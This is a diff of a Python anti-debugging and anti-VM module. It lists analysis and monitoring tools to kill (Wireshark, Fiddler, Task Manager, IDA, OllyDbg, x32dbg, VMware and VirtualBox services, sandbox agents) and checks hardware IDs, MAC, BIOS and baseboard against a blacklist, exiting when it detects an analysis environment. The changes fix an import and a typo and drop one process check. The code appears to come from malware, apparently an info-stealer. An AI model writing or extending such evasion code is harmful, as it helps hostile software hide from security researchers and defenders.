@@ -19,13 +19,12 @@ import subprocess
 import requests
 import platform
 import json
-from data import BlackList
+from scripts.secure.blacklist import BlackList
 
 
 
 
 kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
-
 
 def checkHWID():
     try:
@@ -178,11 +177,6 @@ def AntiDebug(oneStart):
     if checkMAC() in BlackList.Mac_Address:
         os._exit(0)
 
-
-    for exe in processlist:
-        if exe.info.get('name') in BlackList.Processes:
-            os._exit(0)
-
     if checkBIOS() in BlackList.Bios:
         os._exit(0)
 
@@ -191,7 +185,7 @@ def AntiDebug(oneStart):
         os._exit(0)
 
 
-    if checkBASE() in BlackList.aseBoard:
+    if checkBASE() in BlackList.BaseBoard:
         os._exit(0)
 
 
